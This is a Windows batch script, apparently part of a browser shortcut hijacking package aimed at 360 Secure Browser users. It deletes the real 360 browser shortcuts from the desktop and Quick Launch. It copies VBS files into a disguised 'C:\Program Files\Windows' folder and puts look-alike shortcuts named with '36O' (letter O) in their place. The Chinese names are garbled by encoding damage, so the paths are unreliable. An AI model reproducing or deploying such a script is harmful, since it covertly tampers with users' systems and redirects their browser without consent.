del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\360*�����*.lnk"
del   "%ALLUSERSPROFILE%\����\360*�����*.lnk" /f  /q  /a
mkdir       "C:\Program Files\Windows"
copy ".\360SE.vbs"  "C:\Program Files\Windows\360SE.vbs"
copy ".\36OSE.vbs"  "C:\Program Files\Windows\36OSE.vbs"

@echo off 
if not exist "C:\Program Files\360\360se3\360SE.exe"  goto  nofile   
goto start   
                  
:start 
                            
copy ".\36O��ȫ��������3.lnk" "%USERPROFILE%\����\36O��ȫ��������3.lnk"
copy ".\36O��ȫ��������3.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\36O��ȫ��������3.lnk"  
goto ennd 
                              
:nofile 
 if not exist "D:\Program Files\360\360se3\360SE.exe" goto ennd    
 goto start2

:start2 
copy   ".\36O��ȫ�������� 3.lnk" "%USERPROFILE%\����\36O��ȫ�������� 3.lnk"
copy   ".\36O��ȫ�������� 3.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\36O��ȫ�������� 3.lnk"  
goto ennd 

:ennd 


